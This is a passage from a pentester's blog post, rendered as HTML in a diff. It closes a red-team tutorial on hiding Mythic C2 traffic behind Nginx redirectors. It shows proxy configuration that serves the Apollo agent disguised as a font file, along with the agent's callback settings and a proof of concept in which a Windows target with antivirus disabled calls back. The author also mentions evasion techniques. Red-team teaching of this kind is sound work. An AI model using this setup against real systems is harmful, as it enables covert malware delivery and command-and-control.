+</span></span><span style="display:flex;"><span>        proxy_set_header X-Real-IP $remote_addr;
+</span></span><span style="display:flex;"><span>        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+</span></span><span style="display:flex;"><span>        proxy_set_header X-Forwarded-Proto $scheme;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        proxy_hide_header Content-Disposition;
+</span></span><span style="display:flex;"><span>        add_header Content-Type <span style="color:#e6db74">&#34;font/ttf&#34;</span>;
+</span></span><span style="display:flex;"><span>        add_header Content-Disposition <span style="color:#e6db74">&#34;attachment; filename=montserrat.ttf&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Catch-all returning 404</span>
+</span></span><span style="display:flex;"><span>    location / <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> 404;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Test the configuration syntax:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nginx -t
+</span></span></code></pre></div><p>Create a symlink to enable the configuration:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ln -s /etc/nginx/sites-available/mythic.conf /etc/nginx/sites-enabled/
+</span></span></code></pre></div><p>Restart the Nginx service:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo systemctl restart nginx
+</span></span></code></pre></div><h3 id="spawning-apollo">Spawning Apollo</h3>
+<p>Now, let’s create the Apollo agent, which interacts with Windows machines.</p>
+<p>In the Mythic web interface, we create a payload with the following settings:</p>
+<ul>
+<li>Agent -&gt; <code>Apollo</code></li>
+<li>C2 Profile -&gt; <code>HTTP</code></li>
+<li>Callback Host -&gt; <code>https://api.website.com</code></li>
+<li>Callback Port -&gt; <code>443</code></li>
+<li>Output Format -&gt; <code>Shellcode</code></li>
+<li>get_uri -&gt; <code>The path we previously chose in the Nginx configuration</code></li>
+<li>post_uri -&gt; <code>Same as the get_uri</code></li>
+<li>Headers -&gt; <code>The User-Agent we previously selected in Nginx</code></li>
+</ul>
+<figure class="post-image"><img src="/c2redirector/apollo.png">
+</figure>
+
+
+
+
+  <blockquote class="dream-alert note">
+    <p class="heading">
+      <ion-icon name="information-circle-outline"></ion-icon>Note</p>
+    <p>When configuring Nginx on Server 2, in the line where we use <code>proxy_pass https://127.0.0.1:7443/direct/download/92ca6c6b-f9b2-4ab4-8114-dce0936f3a0c;</code> the long string is the agent&rsquo;s ID.
+You can find this ID in Mythic by navigating to <code>Payloads</code> -&gt; <code>Actions</code> -&gt; <code>View Payload Configuration</code></p>
+  </blockquote>
+
+<figure class="post-image"><img src="/c2redirector/apollo2.png">
+</figure>
+
+<h2 id="poc">PoC</h2>
+<p>After completing the setup of the decoy website, configuring both servers along with their Nginx configurations, installing Mythic, and generating the Apollo agent payload, the next step is to deploy the payload on a Windows machine. We transfer the <code>.exe</code> file to the target system and execute it. Upon execution, we observe that the Mythic server receives a callback from the agent, confirming successful communication.</p>
+<figure class="post-image"><img src="/c2redirector/poc1.png">
+</figure>
+
+<figure class="post-image"><img src="/c2redirector/poc2.png">
+</figure>
+
+<p>It&rsquo;s important to note that during this initial testing phase, the antivirus on the target machine was disabled. This is because, at this point, no obfuscation or evasion techniques have been implemented, so the payload is more likely to be detected by security software. The focus here is on verifying that the infrastructure and communication channels are working correctly before adding additional layers of stealth and evasion in future stages.</p>
+<p>In this demonstration, the payload is already present on the victim’s machine. However, it’s also possible to access and download the payload directly via <code>https://api.website.com/assets/fonts/montserrat.ttf</code>.</p>
+<p>With that said, this setup allows for the use of evasion techniques to execute the .ttf file (the Apollo agent) with minimal suspicion, helping to evade defensive measures more effectively.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://xbz0n.sh/blog/mythic-c2-early-bird-defender-evasion" target="_blank">https://xbz0n.sh/blog/mythic-c2-early-bird-defender-evasion</a>
+</li>
+<li><a href="https://ditrizna.medium.com/design-and-setup-of-c2-traffic-redirectors-ec3c11bd227d" target="_blank">https://ditrizna.medium.com/design-and-setup-of-c2-traffic-redirectors-ec3c11bd227d</a>
+</li>
+<li><a href="https://infosecwriteups.com/mastering-c2-redirectors-a-red-blue-teamers-guide-3e1c6d34ecc8" target="_blank">https://infosecwriteups.com/mastering-c2-redirectors-a-red-blue-teamers-guide-3e1c6d34ecc8</a>
+</li>
+<li><a href="https://docs.mythic-c2.net/" target="_blank">https://docs.mythic-c2.net/</a>
+</li>
+</ul>
+
+
+        
+      </section>
+
+      
+      <div class="divider"></div>
+      <div class="flex flex-col md:flex-row justify-between gap-4 py-4">
+        
+        <a role="button" class="btn btn-outline h-12" href="/posts/2025-10-01-0xoposec/" title="0xOPOSEC Summer Challenge 2025">
+          <ion-icon name="chevron-back"></ion-icon>
+          <div class="inline-flex flex-col items-start">
+            <span class="text-base-content/60 text-xs font-normal">Previous page</span>
+            <span class="max-w-48 truncate">0xOPOSEC Summer Challenge 2025</span>
+          </div>
+        </a>
+        
+
+        
+        <a role="button" class="btn btn-outline h-12" href="/posts/2025-07-18-redteaming-ep2e3/" title="Red Teaming EP2 and 3: C2 and Smishing Simulation &#43; C2 and Usb Implant">
+          <div class="inline-flex flex-col items-end">
+            <span class="text-base-content/60 text-xs font-normal">Next page</span>
+            <span class="max-w-48 truncate">Red Teaming EP2 and 3: C2 and Smishing Simulation &#43; C2 and Usb Implant</span>
+          </div>
+          <ion-icon name="chevron-forward"></ion-icon>
+        </a>
+        
+      </div>
+      
+
+      
+    </article>
+  </div>
+
+  <div
+    x-data="tocHighlighter()"
+    @scroll.window="debouncedScroll"
+    class="hidden lg:flex lg:flex-col lg:items-end"
+  >
+    
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#architecture">Architecture</a></li>
+    <li><a href="#meet-mythic">Meet Mythic</a></li>
+    <li><a href="#building-the-bait">Building the Bait</a></li>
+    <li><a href="#crafting-the-redirector">Crafting the Redirector</a>
+      <ul>
+        <li><a href="#nginx-as-a-redirector">Nginx as a Redirector</a></li>
+        <li><a href="#server-1----the-face">Server 1  - The Face</a></li>
+        <li><a href="#server-2---the-whisperer">Server 2 - The Whisperer</a></li>
+        <li><a href="#spawning-apollo">Spawning Apollo</a></li>
+      </ul>
+    </li>
+    <li><a href="#poc">PoC</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+    
+  </div>
+</div>
+
+
+            
+<footer class="flex justify-between items-center gap-2 max-w-[65ch] mx-auto px-4 md:px-0 py-12">
+
+  <div>
+  
+  <p>
+    © 2018 - 2025 Bruno Blog
+  </p>
+  
+
+  
+  <p class="text-sm">
+    🌱
+    <span class="text-base-content/60">
+      Powered by <a class="hover:underline" href="https://gohugo.io/" target="_blank">Hugo</a> with theme
+      <a class="hover:underline" href="https://github.com/g1eny0ung/hugo-theme-dream" target="_blank">Dream</a>.</span
+    >
+  </p>
+  
+</div>
+
+  <div
+  x-data="{ icons: [
+    { name: 'sunny', status: 'n' },
+    { name: 'moon', status: 'y' },
+    { name: 'desktop', status: 'auto' }
+  ] }"
+  class="flex items-center gap-2 h-[32px] px-2 bg-base-100 border border-base-content/30 rounded-full"
+>
+  <template x-for="icon in icons">
+    <div
+      role="button"
+      tabindex="0"
+      :aria-label="'Select ' + icon.name + ' mode'"
+      class="group inline-flex justify-center items-center p-1 rounded-full cursor-pointer hover:bg-primary"
+      :class="$store.darkMode.icon() === icon.name && 'bg-primary'"
+      @click="$store.darkMode.toggle(icon.status)"
+    >
+      <ion-icon
+        :name="`${icon.name}-outline`"
+        class="group-hover:text-primary-content"
+        :class="$store.darkMode.icon() === icon.name && 'text-primary-content'"
+      >
+      </ion-icon>
+    </div>
+  </template>
+</div>
+
+</footer>
+
+          </div>
+        </div>
+        <div class="back">
+          <div class="container">
+            
+            <div class="max-w-[65ch] mt-8 mx-auto px-4">
+  
+  
+  
+  <div>
+    <div class="mb-4 text-lg font-medium"></div>
+
+    <div class="prose dark:prose-invert">
+      <h1 id="about-me">About me</h1>
+<p><em>My name is Bruno Teixeira and I am an Offensive Cyber Security Analyst. Focused on learning Information Security and Systems Administration. Always doing some side projects to improve my coding skills and learn new technologies on the way.</em></p>
+<h2 id="work-experience">Work Experience</h2>
+<ul>
+<li>Pentester @ <a href="https://www.pt.logicalis.com/pt-pt" target="_blank">Logicalis PT</a>
+ (Current)</li>
+<li>Pentester @ <a href="https://www.layer8.pt" target="_blank">Layer8</a>
+</li>
+<li>Offensive Cyber Security Analyst @ <a href="https://artresilia.com/" target="_blank">ArtResilia</a>
+</li>
+<li>Technical Support / Service Desk @ <a href="https://www.cgi.com/en" target="_blank">CGI</a>
+</li>
+<li>Military @ <a href="https://www.exercito.pt/pt" target="_blank">Exército Português</a>
+</li>
+</ul>
+<h2 id="education">Education</h2>
+<ul>
+<li>BsC Computer Engineering @ <a href="https://www.isec.pt" target="_blank">ISEC Coimbra</a>
+</li>
+<li>CET Network and Systems @ <a href="https://www.cinel.pt" target="_blank">CINEL Porto</a>
+</li>
+<li>IT &amp; Programming @ <a href="https://eisnt.com/" target="_blank">EISnt, High School</a>
+</li>
+</ul>
+<h2 id="work-experience-as-a-trainee">Work Experience as a Trainee</h2>
+<ul>
+<li>IT and Network department @ <a href="https://www.islagaia.pt/pt/" target="_blank">ISLA Gaia</a>
+</li>
+<li>Hardware &amp; Software Maintenance @ <a href="http://assistencia35.com/" target="_blank">Assistência 35 LDA</a>
+</li>
+<li>Hardware Maintenance @ <a href="https://www.lojasehorarios.com.pt/dotcenter-informatica-soc-unip-lda/porto/c-58637a1332cff589d8187aa3" target="_blank">DOTcenter</a>
+</li>
+</ul>
+
+    </div>
+  </div>
+  <div class="divider divider-vertical"></div>
+  
+  
+
+  
+  
+  <div class="pb-4">
+  
+    <div class="mb-4 text-lg font-medium">Social Links</div>
+
+    <ul class="menu menu-horizontal flex-wrap w-full px-0 [&_ion-icon]:text-lg">
+  
+  <li>
+    <a href="mailto:brunoalexandre3@hotmail.com" title="Email">
+      <ion-icon name="mail"></ion-icon>
+    </a>
+  </li>
+  
+
+  
+  <li>
+    <a href="https://github.com/BrunoTeixeira1996" target="_blank" title="GitHub">
+      <ion-icon name="logo-github"></ion-icon>
+    </a>
+  </li>
+  
+  <li>
+    <a href="https://x.com/zebisnaga3" target="_blank" title="X">
+      <ion-icon name="logo-x"></ion-icon>
+    </a>
+  </li>
+  
+  <li>
+    <a href="https://www.linkedin.com/in/bruno-teixeira-1553b4a1/" target="_blank" title="Linkedin">
+      <ion-icon name="logo-linkedin"></ion-icon>
+    </a>
+  </li>
+  
+</ul>
+
+  </div>
+  
+
+  
+</div>
+
+            
+
+            
+<footer class="flex justify-between items-center gap-2 max-w-[65ch] mx-auto px-4 md:px-0 py-12">
+
+  <div>
+  
+  <p>
+    © 2018 - 2025 Bruno Blog
+  </p>
+  
+
+  
+  <p class="text-sm">
+    🌱
+    <span class="text-base-content/60">
+      Powered by <a class="hover:underline" href="https://gohugo.io/" target="_blank">Hugo</a> with theme
+      <a class="hover:underline" href="https://github.com/g1eny0ung/hugo-theme-dream" target="_blank">Dream</a>.</span
+    >
+  </p>
+  
+</div>
+
+  <div
+  x-data="{ icons: [
+    { name: 'sunny', status: 'n' },
+    { name: 'moon', status: 'y' },
+    { name: 'desktop', status: 'auto' }
+  ] }"
+  class="flex items-center gap-2 h-[32px] px-2 bg-base-100 border border-base-content/30 rounded-full"
+>
+  <template x-for="icon in icons">
+    <div
+      role="button"
+      tabindex="0"
+      :aria-label="'Select ' + icon.name + ' mode'"
+      class="group inline-flex justify-center items-center p-1 rounded-full cursor-pointer hover:bg-primary"
+      :class="$store.darkMode.icon() === icon.name && 'bg-primary'"
+      @click="$store.darkMode.toggle(icon.status)"
+    >
+      <ion-icon
+        :name="`${icon.name}-outline`"
+        class="group-hover:text-primary-content"
+        :class="$store.darkMode.icon() === icon.name && 'text-primary-content'"
+      >
+      </ion-icon>
+    </div>
+  </template>
+</div>
+
+</footer>
+
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+  window.lightTheme = "emerald"
+  window.darkTheme = "forest"
+</script>
+
+
+
+
+
+<script src="/js/main.js"></script>
+
+    
+
+
+
+
+
+
+
+<script src="/js/toc.js"></script>
+
+
+  
+    <script type="module">
+      import mediumZoom from 'https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/+esm';
+      mediumZoom('#dream-single-post-content img', {
+        background: 'oklch(var(--b1))',
+        margin: 24,
+      })
+    </script>
+  
+
+
+
+
+
+
+    
+
+    
+
+    
+
+    
+
+    <script type="module" src="https://cdn.jsdelivr.net/npm/ionicons@7.4.0/dist/ionicons/ionicons.esm.js" integrity="sha256-/IFmi82bIhdYWctu0UddSlJqpnzWm7Vh2C4CM32wF/k=" crossorigin="anonymous"></script>
+    <script nomodule src="https://cdn.jsdelivr.net/npm/ionicons@7.4.0/dist/ionicons/ionicons.js" integrity="sha256-mr7eJMX3VC3F7G32mk4oWp1C6a2tlMYxUdptfT7uKI8=" crossorigin="anonymous"></script>
+  </body>
+</html>
